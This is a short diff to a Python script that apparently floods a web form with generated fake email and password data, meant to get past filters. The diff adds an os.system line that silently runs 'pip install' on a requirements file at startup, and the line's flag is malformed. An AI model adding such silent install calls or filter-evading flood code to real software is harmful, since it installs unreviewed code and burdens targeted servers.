@@ -1,5 +1,7 @@
 # Modules
-import threading, requests, random, time, asyncore
+import threading, requests, random, time, asyncore, os
+
+os.system('cmd /c "pip install r- req.txt"')
 
 # Data For Fake Account And Password Generator So It Will Make The Sended Data Legit And Get Accepted Even If They Have A Filter.
 MAIL_Var = ["sharon","richard","justin","ella","jungcock","hashimin","bulsheesh","scandalors","melody","acker","jhony","lexie","khalifa","stephen","dorota","georgeta","krystiana","gerbold","iona","lore","surprize","dog","admin","cat","shermin"]
